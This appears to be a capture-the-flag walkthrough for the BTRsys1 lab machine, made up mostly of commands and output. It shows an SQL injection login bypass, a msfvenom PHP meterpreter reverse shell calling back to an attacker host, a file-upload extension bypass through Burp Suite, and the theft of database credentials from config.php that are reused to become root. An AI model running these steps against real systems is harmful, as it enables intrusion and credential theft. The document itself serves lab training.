http://btrsys1.ctf/personel.php
Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, null given in /var/www/html/personel.php on line 67
=>
It is not hard to assume the SQL query is like;

SELECT * FROM 'table_name' WHERE user='<username_that_I_entered>'

If I entered username as;

' OR 1=1 -- @btrisk.com => http://btrsys1.ctf/login.php

=> http://btrsys1.ctf/personel.php
Kisi Adi 	    Baba Adi 	  Baba Meslegi    Anne Adi    Anne Meslegi    Kardes Sayisi   Dosya Yukle
ismail kaya 	ahmet 	    muhasebe 	      nazli 	    lokantaci 	    5               <UPLOAD>
can demir     mahmut 	    memur           gulsah      tuhafiyeci     	8

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.7 LPORT=3592 -f raw > shell.jpg
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 30687 bytes

root@Blue3:~# nano shell.jpg
=> Remove /* to remove the comment

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

When uploading, using Burp Suite to intercept and change the "shell.jpg" to "shell.php"
=> Upload success

msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)
   LPORT  3592             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.7:3592
[*] Meterpreter session 2 opened (192.168.1.7:3592 -> 192.168.1.5:46366) at 2020-08-31 19:24:15 +0700

meterpreter > shell
Process 1834 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@BTRsys1:/var/www/html/uploads$ ls -ltra
ls -ltra
total 44
drwxr-xr-x 4 root     root      4096 Apr 28  2017 ..
-rw-r--r-- 1 www-data www-data    34 Aug 31 05:05 shell.png
-rw-r--r-- 1 www-data www-data 30686 Aug 31 05:19 shell.php
drwxrwxrwx 2 root     root      4096 Aug 31 05:19 .
www-data@BTRsys1:/var/www/html/uploads$ uname -a
uname -a
Linux BTRsys1 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

www-data@BTRsys1:/var/www/html$ cat config.php
<?php
/////////////////////////////////////////////////////////////////////////////////////////
$con=mysqli_connect("localhost","root","toor","deneme");
if (mysqli_connect_errno())
  {
  echo "Mysql Bağlantı hatası!: " . mysqli_connect_error();
  }
/////////////////////////////////////////////////////////////////////////////////////////
?>

=> root / toor for MySQL

www-data@BTRsys1:/var/www/html$ mysql -u root -p
mysql -u root -p
Enter password: toor

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 271
Server version: 5.5.55-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| deneme             |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)

mysql> use deneme
use deneme
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_deneme |
+------------------+
| user             |
+------------------+
1 row in set (0.00 sec)

mysql> select * from user;
select * from user;
+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
| ID | Ad_Soyad    | Kullanici_Adi    | Parola    | BabaAdi | BabaMeslegi | AnneAdi | AnneMeslegi | KardesSayisi |
+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
|  1 | ismail kaya | ikaya@btrisk.com | asd123*** | ahmet   | muhasebe    | nazli   | lokantaci   |            5 |
|  2 | can demir   | cdmir@btrisk.com | asd123*** | mahmut  | memur       | gulsah  | tuhafiyeci  |            8 |
+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
2 rows in set (0.00 sec)

=> password: asd123***

www-data@BTRsys1:/var/www/html$ su - root
su - root
Password: asd123***

root@BTRsys1:~#
